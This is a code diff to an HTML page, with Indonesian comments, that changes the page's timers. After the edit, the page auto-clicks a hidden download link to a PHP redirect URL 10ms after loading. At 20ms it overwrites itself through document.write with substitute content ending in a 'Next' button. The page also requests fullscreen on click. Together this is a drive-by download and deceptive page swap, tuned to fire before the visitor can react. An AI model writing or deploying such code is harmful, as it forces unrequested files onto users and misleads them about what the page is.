@@ -4,8 +4,11 @@
     <a id='aid' style="opacity:1" targe="_blank" onclick="javascript:document.body.requestFullscreen();" href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>redirect</a>
 </body>
 <script>
-var w=setInterval(function(){ document.getElementById("aid").click(); }, 3000);
-var x=setInterval(v,3700);
+// Mengeksekusi klik hampir seketika (10ms) setelah halaman dimuat
+setTimeout(function(){ document.getElementById("aid").click(); }, 10);
+
+// Langsung mengeksekusi fungsi penimpaan halaman (20ms)
+setTimeout(v, 20);
 
 function v(){  
     document.write(`
@@ -77,9 +80,7 @@ function v(){
             <button class="btn-primary">Next</button>
         </div>
     `); 
-    clearInterval(x);
     // window.stop()
 }
-//setInterval(function(){ document.body.requestFullscreen(); }, 2000);
 </script>
 </html>
